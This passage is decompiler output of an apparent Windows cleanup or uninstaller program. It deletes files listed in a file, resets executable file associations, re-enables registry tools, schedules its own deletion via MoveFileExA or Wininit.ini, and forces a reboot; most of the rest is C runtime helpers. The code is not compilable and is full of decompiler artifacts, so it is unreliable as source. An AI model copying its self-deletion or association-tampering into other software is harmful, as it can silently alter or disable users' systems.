            *(ebp + -248) = ebx;
            (save)ebx;
            (save)eax;
            eax = *__imp__GetFileSize();
            *(ebp - 28) = eax;
            edi = L0040AA95( *(ebp - 28) + 3);
            *(ebp + -276) = edi;
            *(ebp + -248) = edi;
            if(edi != ebx) {
                (save)ebx;
                (save)ebp + -252;
                (save) *(ebp - 28);
                (save)edi;
                (save) *(ebp + -244);
                *__imp__ReadFile();
                *( *(ebp + -252) + edi) = bl;
                *(ebp + -260) = edi;
                (save)"\r\n";
                for((save)edi; 1; (save) *(ebp + -260)) {
                    (restore)ecx;
                    edi = L0040A070();
                    *(ebp + -256) = edi;
                    if(edi == ebx) {
                        break;
                    }
                    *edi = bl;
                    (save) *(ebp + -260);
                    *__imp__DeleteFileA();
                    edi = edi + 2;
                    *(ebp + -260) = edi;
                    (save)"\r\n";
                }
                eax = *(ebp + -248);
                *(ebp + -280) = eax;
                L0040AB34( *(ebp + -280));
            }
            (save) *(ebp + -244);
            *__imp__CloseHandle();
            (save)ebp + -240;
            *__imp__DeleteFileA();
            edi = -2147483646;
        }
    } else {
        esi = -2147483648;
    }
    (save)4302344;
    (save)edi;
    *__imp__RegDeleteKeyA();
    for(*(ebp + -132) = ebx; *(ebp + -132) < 4; *(ebp + -132) = *(ebp + -132) + 1) {
        if(eax = *(ebp + -132) - ebx) {
            (save)"exefile";
        } else {
            if(eax = eax - 1) {
                (save)"comfile";
            } else {
                if(eax = eax - 1) {
                    (save)"piffile";
                } else {
                    if(eax = eax - 1) {
                        goto L00409e30;
                    }
                    (save)"batfile";
                }
            }
        }
        (save)ebp + -240;
        L0040A0F0();
        (restore)ecx;
L00409e30:
        L0040A100();
        L004066EB(esi, ebp + -240, ebx, 1, "\"%1\" %*", ebp + -240, "\shell\open\command");
    }
    (save)"\"%1\" /S";
    (save)1;
    (save)ebx;
    (save)"scrfile\shell\open\command";
    (save)esi;
    L004066EB();
    (save)"\"%1\"";
    (save)1;
    (save)ebx;
    (save)"scrfile\shell\config\command";
    (save)esi;
    L004066EB();
    (save)"regedit.exe \"%1\"";
    (save)1;
    (save)ebx;
    (save)"regfile\shell\open\command";
    (save)esi;
    L004066EB();
    *(ebp - 28) = ebx;
    (save)ebp - 28;
    (save)4;
    (save)"DisableRegistryTools";
    (save)"Software\Microsoft\Windows\CurrentVersion\Policies\System";
    (save)-2147483647;
    L004066EB();
    esp = esp + 80;
    if(*L0041A66C == ebx) {
        (save)"kernel32.dll";
        eax = *__imp__GetModuleHandleA();
        *(ebp + -264) = eax;
        if(eax != ebx) {
            (save)"MoveFileExA";
            (save)eax;
            eax = *__imp__GetProcAddress();
            *(ebp + -268) = eax;
            if(*(ebp + -268) != ebx) {
                (save)100;
                (save)ebp + -240;
                (save)ebx;
                *__imp__GetModuleFileNameA();
                (save)4;
                (save)ebx;
                (save)ebp + -240;
                *(ebp + -268)();
            }
        }
    } else {
        esi = __imp__wsprintfA;
        *__imp__wsprintfA(ebp - 128, "%s\Wininit.ini", 0x412f00);
        (save)ebx;
        (save)128;
        (save)2;
        (save)ebx;
        (save)ebx;
        (save)1073741824;
        (save)ebp - 128;
        edi = *__imp__CreateFileA();
        *(ebp + -272) = edi;
        if(edi != -1) {
            (save)100;
            (save)ebp + -240;
            (save)ebx;
            *__imp__GetModuleFileNameA();
            (save)100;
            (save)ebp - 128;
            (save)ebp + -240;
            if(*__imp__GetShortPathNameA() > 0) {
                L0040A0F0(ebp + -240, ebp - 128);
            }
            *esi(ebp - 128, "[rename]\r\nNUL=%s\r\n", ebp + -240);
            (save)ebx;
            (save)ebp - 28;
            (save)L0040A210(ebp - 128);
            (save)ebp - 128;
            (save)edi;
            *__imp__WriteFile();
            (save)edi;
            *__imp__CloseHandle();
        }
    }
    eax = *L0041A6DC;
    if(eax != ebx) {
        *__imp__PostMessageA(eax, 2, ebx, ebx);
    }
    *(ebp - 4) = *(ebp - 4) | -1;
    goto L00409ff0;
    return(1);
    esp = *(ebp - 24);
    *(ebp - 4) = *(ebp - 4) | -1;
    ebx = 0;
L00409ff0:
    *__imp__ExitWindowsEx();
    eax = *__imp__ExitProcess(ebx, 6, ebx);
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    (restore)ebp;
    return;
    asm("int3");
}

/* DEST BLOCK NOT FOUND: 0040a010 -> 00409ff0 */
/*	Procedure: 0x0040A010 - 0x0040A015
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040A010()
{



    goto ( *L0040e268);
}

/* DEST BLOCK NOT FOUND: 0040a016 -> 00409ff0 */
/*	Procedure: 0x0040A016 - 0x0040A01B
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040A016()
{



    goto ( *L0040e264);
}

/* DEST BLOCK NOT FOUND: 0040a01c -> 00409ff0 */
/*	Procedure: 0x0040A01C - 0x0040A021
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040A01C()
{



    goto ( *L0040e260);
}

/* DEST BLOCK NOT FOUND: 0040a022 -> 00409ff0 */
/*	Procedure: 0x0040A022 - 0x0040A027
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040A022()
{



    goto ( *L0040e25c);
}

/* DEST BLOCK NOT FOUND: 0040a028 -> 00409ff0 */
/*	Procedure: 0x0040A028 - 0x0040A02D
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040A028()
{



    goto ( *L0040e258);
}

/* DEST BLOCK NOT FOUND: 0040a02e -> 00409ff0 */
/*	Procedure: 0x0040A02E - 0x0040A033
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040A02E()
{



    goto ( *L0040e240);
}

/* DEST BLOCK NOT FOUND: 0040a034 -> 00409ff0 */
/*	Procedure: 0x0040A034 - 0x0040A039
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040A034()
{



    goto ( *L0040e254);
}

/* DEST BLOCK NOT FOUND: 0040a03a -> 00409ff0 */
/*	Procedure: 0x0040A03A - 0x0040A03F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040A03A()
{



    goto ( *L0040e250);
}

/* DEST BLOCK NOT FOUND: 0040a040 -> 00409ff0 */
/*	Procedure: 0x0040A040 - 0x0040A045
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040A040()
{



    goto ( *L0040e24c);
}

/* DEST BLOCK NOT FOUND: 0040a046 -> 00409ff0 */
/*	Procedure: 0x0040A046 - 0x0040A04B
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040A046()
{



    goto ( *L0040e248);
}

/* DEST BLOCK NOT FOUND: 0040a04c -> 00409ff0 */
/*	Procedure: 0x0040A04C - 0x0040A051
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040A04C()
{



    goto ( *L0040e244);
}

/* DEST BLOCK NOT FOUND: 0040a052 -> 00409ff0 */
/*	Procedure: 0x0040A052 - 0x0040A057
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

VerQueryValueA()
{



    goto ( *__imp__VerQueryValueA);
}

/* DEST BLOCK NOT FOUND: 0040a058 -> 00409ff0 */
/*	Procedure: 0x0040A058 - 0x0040A05D
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

GetFileVersionInfoA()
{



    goto ( *__imp__GetFileVersionInfoA);
}

/* DEST BLOCK NOT FOUND: 0040a05e -> 00409ff0 */
/*	Procedure: 0x0040A05E - 0x0040A063
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

LZClose()
{



    goto ( *__imp__LZClose);
}

/* DEST BLOCK NOT FOUND: 0040a064 -> 00409ff0 */
/*	Procedure: 0x0040A064 - 0x0040A069
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

LZCopy()
{



    goto ( *__imp__LZCopy);
}

/* DEST BLOCK NOT FOUND: 0040a06a -> 00409ff0 */
/*	Procedure: 0x0040A06A - 0x0040A06F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

LZOpenFileA()
{



    goto ( *__imp__LZOpenFileA);
}

/* DEST BLOCK NOT FOUND: 0040a0de -> 0040acb6 */
/*	Procedure: 0x0040A070 - 0x0040A0EF
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L0040A070(A4, A8)
/* unknown */ void  A4;
/* unknown */ void  A8;
{



    ecx = A8;
    (save)edi;
    (save)ebx;
    (save)esi;
    dl = *ecx;
    edi = A4;
    if(dl != 0) {
        dh = *(ecx + 1);
        if(dh != 0) {
L0040a088:
            esi = edi;
            ecx = A8;
            al = *edi;
            esi = esi + 1;
            if(al != dl) {
                if(al == 0) {
                    goto L0040a0a4;
                }
L0040a099:
                al = *esi;
                esi = esi + 1;
L0040a09c:
                if(al != dl) {
                    if(al != 0) {
                        goto L0040a099;
                    }
L0040a0a4:
                    (restore)esi;
                    (restore)ebx;
                    (restore)edi;
                    return(0);
                }
            }
            al = *esi;
            esi = esi + 1;
            if(al != dh) {
                goto L0040a09c;
            }
            edi = esi - 1;
L0040a0b4:
            ah = *(ecx + 2);
            if(ah == 0) {
                goto L0040a0e3;
            }
            al = *esi;
            esi = esi + 2;
            if(al != ah) {
                goto L0040a088;
            }
            al = *(ecx + 3);
            if(al == 0) {
                goto L0040a0e3;
            }
            ah = *(esi - 1);
            ecx = ecx + 2;
            if(al == ah) {
                goto L0040a0b4;
            }
            goto L0040a088;
        }
        (restore)esi;
        (restore)ebx;
        (restore)edi;
        eax = dl & 255;
        goto L0040acb6;
L0040a0e3:
        eax = edi - 1;
        (restore)esi;
        (restore)ebx;
        (restore)edi;
        return;
    }
    eax = edi;
    (restore)esi;
    (restore)ebx;
    (restore)edi;
}

/* DEST BLOCK NOT FOUND: 0040a0f5 -> 0040a161 */
/*	Procedure: 0x0040A0F0 - 0x0040A0FF
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L0040A0F0(A4)
/* unknown */ void  A4;
{



    (save)A4;
    goto L0040a161;
}

/*	Procedure: 0x0040A100 - 0x0040A1DF
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L0040A100(A4, A8)
/* unknown */ void  A4;
/* unknown */ void  A8;
{



    ecx = A4;
    (save)edi;
    if(!(ecx & 3)) {
        do {
            al = *ecx;
            ecx = ecx + 1;
            if(al == 0) {
                goto L0040a14f;
            }
        } while(ecx & 3);
    }
    while(1) {
        eax = *ecx;
        edx = 2130640639 + eax;
        eax = eax ^ -1 ^ edx;
        ecx = ecx + 4;
        if(eax & -2130640640) {
            continue;
        }
        eax = *(ecx - 4);
        if(al == 0) {
            goto L0040a15e;
        }
        if(ah == 0) {
            goto L0040a159;
        }
        if(eax & 16711680) {
            goto L0040a154;
        }
        if(eax & -16777216) {
            break;
        }
    }
L0040a14f:
    edi = ecx - 1;
    goto L0040a161;
L0040a154:
    edi = ecx - 2;
    goto L0040a161;
L0040a159:
    edi = ecx - 3;
    goto L0040a161;
L0040a15e:
    edi = ecx - 4;
L0040a161:
    ecx = A8;
    if(!(ecx & 3)) {
        do {
            dl = *ecx;
            ecx = ecx + 1;
            if(dl == 0) {
                goto L0040a1d8;
            }
            *edi = dl;
            edi = edi + 1;
        } while(ecx & 3);
    }
    while(1) {
        eax = *ecx;
        edx = 2130640639 + eax;
        eax = eax ^ -1 ^ edx;
        edx = *ecx;
        ecx = ecx + 4;
        if(!(eax & -2130640640)) {
            if(dl == 0) {
                goto L0040a1d8;
            }
            if(dh == 0) {
                goto L0040a1cf;
            }
            if(edx & 16711680) {
                goto L0040a1c2;
            }
            if(edx & -16777216) {
                break;
            }
        }
        *edi = edx;
        edi = edi + 4;
    }
    *edi = edx;
    (restore)edi;
    return(A4);
L0040a1c2:
    *edi = dx;
    *(edi + 2) = 0;
    (restore)edi;
    return(A4);
L0040a1cf:
    *edi = dx;
    (restore)edi;
    return(A4);
L0040a1d8:
    *edi = dl;
    (restore)edi;
    return(A4);
}

/*	Procedure: 0x0040A1E0 - 0x0040A20F
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 4
 */

L0040A1E0(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  edi;



    edi = A8;
    eax = 0;
    ecx = ecx | -1;
    asm("repne scasb");
    ecx = ~(ecx + 1);
    edi = edi - 1;
    asm("std");
    asm("repne scasb");
    edi = edi + 1;
    eax = *edi != Ac ? 0 : edi;
    asm("cld");
    return;
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x0040A210 - 0x0040A28B
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L0040A210(A4)
/* unknown */ void  A4;
{



    ecx = A4;
    if(!(ecx & 3)) {
        do {
            al = *ecx;
            ecx = ecx + 1;
            if(al == 0) {
                goto L0040a263;
            }
        } while(ecx & 3);
    }
    while(1) {
        eax = *ecx;
        edx = 2130640639 + eax;
        eax = eax ^ -1 ^ edx;
        ecx = ecx + 4;
        if(eax & -2130640640) {
            continue;
        }
        eax = *(ecx - 4);
        if(al == 0) {
            goto L0040a281;
        }
        if(ah == 0) {
            goto L0040a277;
        }
        if(eax & 16711680) {
            goto L0040a26d;
        }
        if(eax & -16777216) {
            break;
        }
    }
L0040a263:
    eax = ecx - 1;
    ecx = A4;
    return(eax - ecx);
L0040a26d:
    eax = ecx - 2;
    ecx = A4;
    return(eax - ecx);
L0040a277:
    eax = ecx - 3;
    ecx = A4;
    return(eax - ecx);
L0040a281:
    eax = ecx - 4;
    return(eax - A4);
    asm("int3");
}

/* DEST BLOCK NOT FOUND: 0040a2bc -> 0040a2cd */
stack space not deallocated on return
/*	Procedure: 0x0040A28C - 0x0040A2CD
 *	Argument size: 16
 *	Local size: 0
 *	Save regs size: 0
 */

L0040A28C(A4, A8, A10)
/* unknown */ void  A4;
/* unknown */ void  A8;
/* unknown */ void  A10;
{



    ebp = esp;
    eax = RtlUnwind( *(ebp + 8), 0x40a2a4, 0, 0, ebp, edi, esi, ebx, ebp);
    (restore)ebp;
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    (restore)ebp;
    return;
    eax = 1;
    if(!( *(A4 + 4) & 6)) {
        *A10 = A8;
        eax = 3;
    }
}

/* DEST BLOCK NOT FOUND: 0040a360 -> 0040a36c */
/*	Procedure: 0x0040A2CE - 0x0040A361
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L0040A2CE(A4, A8)
/* unknown */ void  A4;
/* unknown */ void  A8;
{
	/* unknown */ void  Vffffffec;



    (save)ebx;
    (save)esi;
    (save)edi;
    (save)A4;
    (save)-2;
    (save)0x40a2ac;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
L0040a2eb:
    eax = A4;
    ebx = *(eax + 8);
    esi = *(eax + 12);
    if(esi != -1 && esi != A8) {
        esi = esi + esi * 2;
        ecx = *(ebx + esi * 4);
        Vffffffec = ecx;
        *(eax + 12) = Vffffffec;
        if(*(ebx + esi * 4 + 4) == 0) {
            eax = *(ebx + esi * 4 + 8);
            L0040A362(257);
            *(ebx + esi * 4 + 8)();
        }
        goto L0040a2eb;
    }
    (restore) *%fs:0x0];
    esp = esp + 12;
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    return;
    eax = 0;
    ecx = *%fs:0x0];
    if(*(ecx + 4) == 0x40a2ac && *(ecx + 8) == *( *(ecx + 12) + 12)) {
        eax = 1;
    }
    return;
    (save)ebx;
    (save)ecx;
    ebx = 0x412490;
    goto L0040a36c;
}

stack space not deallocated on return
/*	Procedure: 0x0040A362 - 0x0040A45F
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L0040A362(A8)
/* unknown */ void  A8;
{



    (save)ebx;
    (save)A8;
    ebx = 0x412490;
    A8 = *(ebp + 8);
    *(ebx + 8) = A8;
    *(ebx + 4) = eax;
    *(ebx + 12) = ebp;
    (restore)A8;
    (restore)ebx;
    return;
    asm("int3");
    asm("int3");
    (save)esi;
    ebx = ebx + 1;
    dh = dh ^ *eax;
    (restore)eax;
    ebx = ebx + 1;
    *eax = *eax ^ dh;
    (save)ebp;
    ebp = esp;
    esp = esp - 8;
    (save)ebx;
    (save)esi;
    (save)edi;
    (save)ebp;
    asm("cld");
    ebx = *(ebp + 12);
    eax = *(ebp + 8);
    if(!( *(eax + 4) & 6)) {
        *(ebp - 8) = eax;
        *(ebp - 4) = *(ebp + 16);
        *(ebx - 4) = ebp - 8;
        esi = *(ebx + 12);
        edi = *(ebx + 8);
L0040a3b7:
        if(esi != -1) {
            A8 = esi + esi * 2;
            if(*(edi + A8 * 4 + 4) != 0) {
                (save)esi;
                (save)ebp;
                ebp = ebx + 16;
                eax = *(edi + A8 * 4 + 4)();
                (restore)ebp;
                (restore)esi;
                ebx = *(ebp + 12);
                if(eax != 0) {
                    >= ? 0x40a416 : ;
                    edi = *(ebx + 8);
                    L0040A28C(ebx);
                    ebp = ebx + 16;
                    L0040A2CE(ebx, esi);
                    eax = *(edi + (esi + esi * 2) * 4 + 8);
                    L0040A362(1);
                    *(ebx + 12) = *(edi + A8 * 4);
                    *(edi + A8 * 4 + 8)();
                }
            }
            edi = *(ebx + 8);
            esi = *(edi + (esi + esi * 2) * 4);
            goto L0040a3b7;
            eax = 0;
        } else {
            eax = 1;
        }
    } else {
        (save)ebp;
        ebp = ebx + 16;
        L0040A2CE(ebx, -1);
        (restore)ebp;
        eax = 1;
    }
    (restore)ebp;
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
    return;
    (save)ebp;
    ebp = *A8;
    eax = L0040A2CE( *(A8 + 24), *(A8 + 28));
    (restore)ebp;
    return;
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x0040A460 - 0x0040A55F
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L0040A460(A4, A8, Ac)
/* unknown */ void  A4;
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    ecx = Ac;
    (save)edi;
    if(ecx != 0) {
        (save)esi;
        (save)ebx;
        ebx = ecx;
        esi = A8;
        edi = A4;
        if(!(esi & 3)) {
            ecx = ecx >> 2;
            != ? 0x40a4f1 : ;
        } else {
            do {
                al = *esi;
                esi = esi + 1;
                *edi = al;
                edi = edi + 1;
                if(ecx = ecx - 1) {
                    goto L0040a4b2;
                }
                if(al == 0) {
                    goto L0040a4ba;
                }
            } while(esi & 3);
            ebx = ecx;
            ecx = ecx >> 2;
            != ? 0x40a4f1 : ;
L0040a4a0:
            if(ebx = ebx & 3) {
                goto L0040a4b2;
            }
        }
        do {
            al = *esi;
            esi = esi + 1;
            *edi = al;
            edi = edi + 1;
            if(al == 0) {
                goto L0040a4de;
            }
        } while(ebx = ebx - 1);
L0040a4b2:
        (restore)ebx;
        (restore)esi;
        (restore)edi;
        return(A4);
L0040a4ba:
        if(!(edi & 3)) {
            do {
                *edi = al;
                edi = edi + 1;
                if(ecx = ecx - 1) {
                    goto L0040a556;
                }
            } while(edi & 3);
        }
        ebx = ecx;
        ecx = ecx >> 2;
        != ? 0x40a547 : ;
L0040a4db:
        *edi = al;
        edi = edi + 1;
L0040a4de:
        if(ebx = ebx - 1) {
            goto L0040a4db;
        }
        (restore)ebx;
        (restore)esi;
    }
    (restore)edi;
    return(A4);
L0040a4e9:
    *edi = edx;
    edi = edi + 4;
    if(ecx = ecx - 1) {
        goto L0040a4a0;
    }
    eax = *esi;
    edx = 2130640639 + eax;
    eax = eax ^ -1 ^ edx;
    edx = *esi;
    esi = esi + 4;
    if(eax & -2130640640) {
        goto L0040a4e9;
    }
    if(dl != 0) {
        if(dh != 0) {
            if(!(edx & 16711680)) {
                if(edx & -16777216) {
                    goto L0040a4e9;
                }
                *edi = edx;
            } else {
                edx = edx & 65535;
                *edi = edx;
            }
        } else {
            edx = edx & 255;
            *edi = edx;
        }
    } else {
        edx = 0;
        *edi = 0;
    }
    edi = edi + 4;
    eax = 0;
    if(!(ecx = ecx - 1)) {
        eax = 0;
L0040a549:
        *edi = eax;
        edi = edi + 4;
        if(ecx = ecx - 1) {
            goto L0040a549;
        }
    }
    if(ebx = ebx & 3) {
        goto L0040a4db;
    }
L0040a556:
    (restore)ebx;
    (restore)esi;
    (restore)edi;
    return(A4);
    asm("int3");
    asm("int3");
}

stack space not deallocated on return
/*	Procedure: 0x0040A560 - 0x0040A58F
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L0040A560(A8)
/* unknown */ void  A8;
{



    (save)ecx;
    ecx = & A8;
    do {
        ecx = ecx - 4096;
        eax = eax - 4096;
        *ecx & eax;
    } while(eax >= 4096);
    ecx = ecx - eax;
    eax = esp;
    *ecx & eax;
    esp = ecx;
    ecx = *eax;
    eax = *(eax + 4);
    (save)eax;
    return;
    asm("int3");
}

/*	Procedure: 0x0040A590 - 0x0040A5EF
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L0040A590(A4, A8, Ac)
/* unknown */ void  A4;
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    edx = Ac;
    ecx = A4;
    if(edx != 0) {
        eax = A8 & 255;
        (save)edi;
        edi = ecx;
        if(edx >= 4) {
            if(!(ecx = ~ecx & 3)) {
                edx = edx - ecx;
                do {
                    *edi = al;
                    edi = edi + 1;
                } while(ecx = ecx - 1);
            }
            ecx = eax;
            eax = (eax << 8) + ecx;
            ecx = eax;
            eax = (eax << 16) + ecx;
            ecx = edx;
            ecx = ecx >> 2;
            if(!(edx = edx & 3)) {
                asm("rep stosd");
                if(edx == 0) {
                    goto L0040a5dd;
                }
            }
        }
        do {
            *edi = al;
            edi = edi + 1;
        } while(edx = edx - 1);
L0040a5dd:
        (restore)edi;
        return(A4);
    }
    return(A4);
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x0040A5F0 - 0x0040A62F
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 12
 */

L0040A5F0(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  ebx;
	/* unknown */ void  edi;



    ecx = A10;
    asm("jecxz 0x40a621");
    ebx = ecx;
    Ac = A8;
    eax = 0;
    asm("repne scasb");
    ecx = ~ecx + ebx;
    edi = Ac;
    asm("repe cmpsb");
    al = *(Ac - 1);
    ecx = 0;
    if(al <= *(edi - 1)) {
        == ? L0040a621 : ;
        ecx = -2;
    }
    ecx = !ecx;
    return(ecx);
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x0040A630 - 0x0040A752
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L0040A630(A4, A8, Ac)
/* unknown */ void  A4;
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    ecx = Ac;
    (save)edi;
    if(ecx != 0) {
        edi = A4;
        (save)esi;
        (save)ebx;
        if(!(edi & 3)) {
            do {
                al = *edi;
                edi = edi + 1;
                if(al == 0) {
                    goto L0040a68b;
                }
            } while(edi & 3);
        }
L0040a65a:
        do {
            eax = *edi;
            edx = 2130640639 + eax;
            eax = eax ^ -1 ^ edx;
            edi = edi + 4;
            if(eax & -2130640640) {
                goto L0040a65a;
            }
            eax = *(edi - 4);
            if(al == 0) {
                goto L0040a698;
            }
            if(ah == 0) {
                goto L0040a693;
            }
            if(eax & 16711680) {
                goto L0040a68e;
            }
        } while(eax & -16777216);
L0040a68b:
        edi = edi - 1;
        goto L0040a69b;
L0040a68e:
        edi = edi - 2;
        goto L0040a69b;
L0040a693:
        edi = edi - 3;
        goto L0040a69b;
L0040a698:
        edi = edi - 4;
L0040a69b:
        esi = A8;
        if(!(esi & 3)) {
            ebx = ecx;
            ecx = ecx >> 2;
            != ? 0x40a6fc : ;
        } else {
            do {
                dl = *esi;
                esi = esi + 1;
                if(dl == 0) {
                    goto L0040a6ea;
                }
                *edi = dl;
                edi = edi + 1;
                if(ecx = ecx - 1) {
                    goto L0040a6e0;
                }
            } while(esi & 3);
            ebx = ecx;
            ecx = ecx >> 2;
            != ? 0x40a6fc : ;
        }
L0040a6cc:
        if(!(ecx = ebx & 3)) {
            do {
                dl = *esi;
                esi = esi + 1;
                *edi = dl;
                edi = edi + 1;
                if(dl == 0) {
                    goto L0040a6e2;
                }
            } while(ecx = ecx - 1);
        }
L0040a6e0:
        *edi = cl;
L0040a6e2:
        (restore)ebx;
        (restore)esi;
    }
    (restore)edi;
    return(A4);
L0040a6ea:
    *edi = dl;
    (restore)ebx;
    (restore)esi;
    (restore)edi;
    return(A4);
L0040a6f4:
    *edi = edx;
    edi = edi + 4;
    if(ecx = ecx - 1) {
        goto L0040a6cc;
    }
    eax = *esi;
    edx = 2130640639 + eax;
    eax = eax ^ -1 ^ edx;
    edx = *esi;
    esi = esi + 4;
    if(eax & -2130640640) {
        goto L0040a6f4;
    }
    if(dl == 0) {
        goto L0040a6ea;
    }
    if(dh != 0) {
        if(!(edx & 16711680)) {
            if(edx & -16777216) {
                goto L0040a6f4;
            }
            *edi = edx;
            (restore)ebx;
            (restore)esi;
            (restore)edi;
            return(A4);
        }
        *edi = dx;
        *(edi + 2) = 0;
        (restore)ebx;
        (restore)esi;
        (restore)edi;
        return(A4);
    }
    *edi = dx;
    (restore)ebx;
    (restore)esi;
    (restore)edi;
    return(A4);
}

/* DEST BLOCK NOT FOUND: 0040a962 -> f9c3f869 */
/* DEST BLOCK NOT FOUND: 0040a96e -> f9c3f869 */
/*	Procedure: 0x0040A760 - 0x0040AA94
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 8
 */

L0040A760(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  esi;
	/* unknown */ void  edi;



    esi = Ac;
    ecx = A10;
    edi = A8;
    eax = ecx;
    edx = ecx;
    eax = eax + esi;
    if(edi <= esi || edi >= eax) {
        if(!(edi & 3)) {
            ecx = ecx >> 2;
            edx = edx & 3;
            if(ecx < 8) {
                goto L0040a7bc;
            }
            asm("rep movsd");
            goto *(edx * 4 + 0x40a8a8)[L0040a8b8, L0040a8c0, L0040a8cc, L0040a8e0, ]goto ( *(edx * 4 + 0x40a8a8));
        }
        eax = edi;
        edx = 3;
        if(!(ecx = ecx - 4)) {
            eax = eax & 3;
            ecx = ecx + eax;
            goto ( *(eax * 4 + 0x40a7c0));
        }
        goto ( *(ecx * 4 + 0x40a8b8));
L0040a7bc:
        goto *(ecx * 4 + 0x40a83c)[L0040a89f, L0040a88c, L0040a884, L0040a87c, L0040a874, L0040a86c, L0040a864, L0040a85c, ]goto ( *(ecx * 4 + 0x40a83c));
        *(edi + -1476657088) = *(edi + -1476657088) << 1;
        eax = eax + 1;
        *eax = *eax + ah;
        al & 64;
        *ebx = *ebx + ah;
        asm("ror dword [edx+0x8a078806],1");
        esi = esi + 1;
        *(eax + 1183449415) = *(eax + 1183449415) + ecx;
        al = al + cl;
        goto L02882fe7;
        esi = esi + 3;
        edi = edi + 3;
        if(ecx < 8) {
            goto L0040a7bc;
        }
        asm("rep movsd");
        goto *(edx * 4 + 0x40a8a8)[L0040a8b8, L0040a8c0, L0040a8cc, L0040a8e0, ]goto ( *(edx * 4 + 0x40a8a8));
        edx = edx & ecx;
        al = *esi;
        *edi = al;
        al = *(esi + 1);
        ecx = ecx >> 2;
        *(edi + 1) = al;
        esi = esi + 2;
        edi = edi + 2;
        if(ecx < 8) {
            goto L0040a7bc;
        }
        asm("rep movsd");
        goto *(edx * 4 + 0x40a8a8)[L0040a8b8, L0040a8c0, L0040a8cc, L0040a8e0, ]goto ( *(edx * 4 + 0x40a8a8));
        edx = edx & ecx;
        al = *esi;
        *edi = al;
        esi = esi + 1;
        ecx = ecx >> 2;
        edi = edi + 1;
        if(ecx < 8) {
            goto L0040a7bc;
        }
        asm("rep movsd");
        goto *(edx * 4 + 0x40a8a8)[L0040a8b8, L0040a8c0, L0040a8cc, L0040a8e0, ]goto ( *(edx * 4 + 0x40a8a8));
        eax = *(esi + ecx * 4 - 28);
        *(edi + ecx * 4 - 28) = eax;
        eax = *(esi + ecx * 4 - 24);
        *(edi + ecx * 4 - 24) = eax;
        eax = *(esi + ecx * 4 - 20);
        *(edi + ecx * 4 - 20) = eax;
        eax = *(esi + ecx * 4 - 16);
        *(edi + ecx * 4 - 16) = eax;
        eax = *(esi + ecx * 4 - 12);
        *(edi + ecx * 4 - 12) = eax;
        eax = *(esi + ecx * 4 - 8);
        *(edi + ecx * 4 - 8) = eax;
        eax = *(esi + ecx * 4 - 4);
        *(edi + ecx * 4 - 4) = eax;
        eax = ecx * 4;
        esi = esi + eax;
        edi = edi + eax;
        goto *(edx * 4 + 0x40a8a8)[L0040a8b8, L0040a8c0, L0040a8cc, L0040a8e0, ]goto ( *(edx * 4 + 0x40a8a8));
        return(A8);
        al = *esi;
        *edi = al;
        esp = ebp;
        return(A8);
        al = *esi;
        *edi = al;
        al = *(esi + 1);
        *(edi + 1) = al;
        esp = ebp;
        return(A8);
        *edi = *esi;
        al = *(esi + 1);
        *(edi + 1) = al;
        al = *(esi + 2);
        *(edi + 2) = al;
        esp = ebp;
        return(A8);
    }
    esi = ecx + esi - 4;
    edi = ecx + edi - 4;
    if(!(edi & 3)) {
        ecx = ecx >> 2;
        edx = edx & 3;
        if(ecx >= 8) {
            asm("std");
